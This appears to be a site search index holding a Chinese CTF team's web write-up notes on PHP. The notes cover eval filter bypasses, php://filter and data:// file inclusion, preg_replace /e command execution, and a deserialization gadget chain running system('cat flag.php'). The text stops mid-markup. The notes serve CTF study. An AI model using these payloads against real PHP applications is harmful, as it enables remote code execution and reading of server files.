<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ROIS WP</title>
    <link href="/2023/01/31/ROISWP/"/>
    <url>/2023/01/31/ROISWP/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">ROIS web first easyphp<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$class</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;system cat /flag&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;------&#x27;</span>;<br>    <span class="hljs-variable">$str1</span>=substr(<span class="hljs-variable">$class</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>);<br>    <span class="hljs-variable">$str2</span>=substr(<span class="hljs-variable">$class</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>);<br><span class="hljs-comment">//    $c=&quot;system&quot;;</span><br><span class="hljs-comment">//    $d=&quot;ipconfig&quot;;</span><br><span class="hljs-comment">//    $c($d);</span><br><span class="hljs-comment">//    var_dump($c);</span><br><span class="hljs-comment">//    var_dump($str1);</span><br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br><span class="hljs-comment">//$a = &#x27;system&#x27;;</span><br><span class="hljs-comment">//    (&#x27;system&#x27;)(&#x27;ipconfig&#x27;);</span><br></code></pre></td></tr></table></figure><p><a href="https://segmentfault.com/a/1190000018991087">php伪协议</a></p><p>preg_replace()：</p><p>函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行</p><p>$data = file_get_contents(“php://input”);</p><h2 id="random-writing"><a href="#random-writing" class="headerlink" title="random writing"></a>random writing</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">    php:<span class="hljs-comment">//input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。 </span><br>    <br> <br><span class="hljs-number">1</span>, php:<span class="hljs-comment">//input 可以读取http entity body中指定长度的值,由Content-Length指定长度,不管是POST方式或者GET方法提交过来的数据。但是，一般GET方法提交数据 时，http request entity body部分都为空。 </span><br><span class="hljs-number">2</span>,php:<span class="hljs-comment">//input 与$HTTP_RAW_POST_DATA读取的数据是一样的，都只读取Content-Type不为multipart/form-data的数据。</span><br>学习笔记<br> <span class="hljs-number">1</span>，Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量<span class="hljs-variable">$_POST</span> <br> <span class="hljs-number">2</span>，PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量<span class="hljs-variable">$HTTP_RAW_POST_DATA</span> <br> <span class="hljs-number">3</span>, 只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php:<span class="hljs-comment">//input，否则其它情况都会。填入的长度，由Coentent-Length指定。 </span><br> <span class="hljs-number">4</span>，只有Content-Type为application/x-www-data-urlencoded时，php:<span class="hljs-comment">//input数据才跟$_POST数据相一致。 </span><br> <span class="hljs-number">5</span>，php:<span class="hljs-comment">//input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini </span><br> <span class="hljs-number">6</span>，PHP会将PATH字段的query_path部分，填入全局变量<span class="hljs-variable">$_GET</span>。通常情况下，GET方法提交的http请求，body为空。<br> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">一些获取方式：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$get</span>=<span class="hljs-variable">$_GET</span>;<br>var_dump(<span class="hljs-variable">$get</span>);<span class="hljs-comment">#array(1) &#123; [&quot;c&quot;]=&gt; string(6) &quot;123123&quot; &#125;</span><br><br><span class="hljs-variable">$cookie</span>=<span class="hljs-variable">$_COOKIE</span>;<br>var_dump(<span class="hljs-variable">$cookie</span>);<span class="hljs-comment"># array(1) &#123; [&quot;Phpstorm-67f2d95b&quot;]=&gt; string(36) &quot;36578afe-712e-4cf0-b3f3-5cf44cc783a5&quot; &#125;</span><br><br><span class="hljs-variable">$requri</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>var_dump(<span class="hljs-variable">$requri</span>);<span class="hljs-comment">#string(10) &quot;/index.php&quot;</span><br><br><span class="hljs-variable">$post</span> = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>var_dump(<span class="hljs-variable">$post</span>);<span class="hljs-comment">// string(22) &quot;a=123123123&amp;Cookie=123&quot;</span><br></code></pre></td></tr></table></figure><p><a href="http://c.biancheng.net/php/">PHP</a> $<em>FILES</em></p><p> 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $_FILES 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。</p><p><a href="https://mp.weixin.qq.com/s/UgdVarWXZLFM1CnbaeXm1g">命令代码执行</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//参数逃逸</span><br>?c=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>];&amp;<span class="hljs-number">1</span>=system(<span class="hljs-string">&#x27;ls&#x27;</span>)); <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//构造不是很懂</span><br><br><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\=|\+|\&#123;|\&#125;|\[|\]|\;|\&#x27;|\&quot;|\,|\&lt;|\&gt;|\.|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>)) &#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br>提示payload:?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br><br>?c=print_r(get_defined_vars());  <span class="hljs-comment">#拿到所有的变量</span><br><br>在这里使用post请求加入给<span class="hljs-keyword">Array</span>加入一个新的变量phpinfo()再执行<br>?c=print_r(next(get_defined_vars())); 使用next方法拿到下一个变量<br>?c=<span class="hljs-keyword">eval</span>(array_pop((next(get_defined_vars()))); <span class="hljs-comment">#使用array__pop拿到变量再执行</span><br>array_pop()返回数组的最后一个值。如果数组是空的，或者非数组，将返回 <span class="hljs-literal">NULL</span>。<br>        <br>post传值<span class="hljs-number">1</span>=system(<span class="hljs-string">&quot;tac fla?.php&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</span><br>   <br>    <br>    <br>    <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><span class="hljs-comment">//preg_replace()函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行</span><br><br><span class="hljs-comment">//php5.5.0起的一个漏洞，pl为 /?.*=&#123;$&#123;phpinfo()&#125;&#125;。get值是/?.*,参数是&#123;$&#123;phpinfo()&#125;&#125;。有些网页会将.*转换为_所以构造next.php?\S*=$&#123;getflag()&#125;&amp;cmd=system(&#x27;ls /&#x27;);</span><br><br></code></pre></td></tr></table></figure><p>ROIS寒假web2022-2-5.</p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&amp;app_version=5.0.1&amp;code=app_1562916241&amp;uLinkId=usr1mkqgl919blen">php反序列化</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//源码</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Kitten</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$friend</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$word</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span class="hljs-variable">$word</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">meow</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Meow~ My name is &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findFriend</span>(<span class="hljs-params"><span class="hljs-variable">$sleepingKitten</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;friend = unserialize(<span class="hljs-variable">$sleepingKitten</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Witch</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$incantation</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;incantation);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Witch&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$sleepingKitten</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/incantation/i&quot;</span>, <span class="hljs-variable">$sleepingKitten</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h3&gt;Witchcraft is NOT ALLOWED!&lt;h3&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$pusheen</span> = <span class="hljs-keyword">new</span> Kitten(<span class="hljs-string">&quot;pusheen&quot;</span>);<br><span class="hljs-variable">$pusheen</span>-&gt;meow();<br><span class="hljs-variable">$sleepingKitten</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;friend&quot;</span>];<br>check(<span class="hljs-variable">$sleepingKitten</span>);<br><span class="hljs-variable">$pusheen</span>-&gt;findFriend(<span class="hljs-variable">$sleepingKitten</span>);<br><span class="hljs-variable">$pusheen</span>-&gt;friend-&gt;meow();<br><br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Kitten</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$friend</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span class="hljs-keyword">new</span> Witch();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">meow</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Meow~ My name is &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findFriend</span>(<span class="hljs-params"><span class="hljs-variable">$sleepingKitten</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;friend = unserialize(<span class="hljs-variable">$sleepingKitten</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Witch</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$incantation</span>=<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;incantation);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Witch&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Kitten();<br><span class="hljs-variable">$a</span>=serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\n\n&quot;</span>;<br><span class="hljs-variable">$c</span>=urlencode(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;O%3A6%3A%22Kitten%22%3A3%3A%7Bs%3A12%3A%22%00Kitten%00name%22%3BN%3Bs%3A6%3A%22friend%22%3BN%3Bs%3A0%3A%22%22%3BO%3A5%3A%22Witch%22%3A1%3A%7BS%3A18%3A%22%00Witch%00%5C69ncantation%22%3Bs%3A24%3A%22system%28%27cat+shell.php%27%29%3B%22%3B%7D%7D&#x27;</span>;<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-string">&#x27;\\69&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-keyword">echo</span> base64_encode(urldecode(<span class="hljs-variable">$c</span>));<br><span class="hljs-comment">//这里学到了使用url编码解决%00显示不了的问题，整体都在php内部执行才不会扰乱编码，echo或者ctrlcv不会成功，getget！</span><br><br><br><span class="hljs-comment">//16进制绕过正则表达式，大写S以及编码转换，实质是符号的ascll码转换成16进制。</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;username&#x27;</span>) !== <span class="hljs-literal">False</span>) &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;你绕不过！！&quot;</span> .PHP_EOL);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 未作处理前</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> test());<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$a</span> = check(<span class="hljs-variable">$a</span>);<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// 做处理后 \75是u的16进制</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$a</span> = check(<span class="hljs-variable">$a</span>);<br>var_dump(unserialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//好好读题，不要想当然</span><br><br></code></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/vuls/202819.html">PHP SESSION反序列化</a></p><h2 id="php-study"><a href="#php-study" class="headerlink" title="php study"></a>php study</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#  PHP 有一个 echo 标记简写 &lt;?=， 它是更完整的 &lt;?php echo 的简写形式。</span><br><span class="hljs-meta">&lt;?=</span> system(whoami)<span class="hljs-meta">?&gt;</span><br><span class="hljs-number">1</span>.  <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;if you want to serve PHP code in XHTML or XML documents,use these tags&#x27;</span>; <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-number">2</span>.  You can <span class="hljs-keyword">use</span> <span class="hljs-title">the</span> <span class="hljs-title">short</span> <span class="hljs-title">echo</span> <span class="hljs-title">tag</span> <span class="hljs-title">to</span> &lt;?= &#x27;<span class="hljs-title">print</span> <span class="hljs-title">this</span> <span class="hljs-title">string</span>&#x27; ?&gt;.<br>    <span class="hljs-title">It</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">equivalent</span> <span class="hljs-title">to</span> &lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> &#x27;<span class="hljs-title">print</span> <span class="hljs-title">this</span> <span class="hljs-title">string</span>&#x27; ?&gt;.<br><br>3.  &lt;? <span class="hljs-title">echo</span> &#x27;<span class="hljs-title">this</span> <span class="hljs-title">code</span> <span class="hljs-title">is</span> <span class="hljs-title">within</span> <span class="hljs-title">short</span> <span class="hljs-title">tags</span>, <span class="hljs-title">but</span> <span class="hljs-title">will</span> <span class="hljs-title">only</span> <span class="hljs-title">work</span> &#x27;.<br>&#x27;<span class="hljs-title">if</span> <span class="hljs-title">short_open_tag</span> <span class="hljs-title">is</span> <span class="hljs-title">enabled</span>&#x27;; <span class="hljs-meta">?&gt;</span><br>短标记 (第三个例子) 是被默认开启的，但是也可以通过 short_open_tag php.ini 来直接禁用。如果 PHP 在被安装时使用了 --disable-short-tags 的配置，该功能则是被默认禁用的。<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>php可嵌套进html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$expression</span> == <span class="hljs-literal">true</span>): <span class="hljs-meta">?&gt;</span><br>   This will show <span class="hljs-keyword">if</span> the expression is <span class="hljs-literal">true</span>.<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">else</span>: <span class="hljs-meta">?&gt;</span><br>  Otherwise this will show.<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#结果输出   This will show if the expression is true.</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 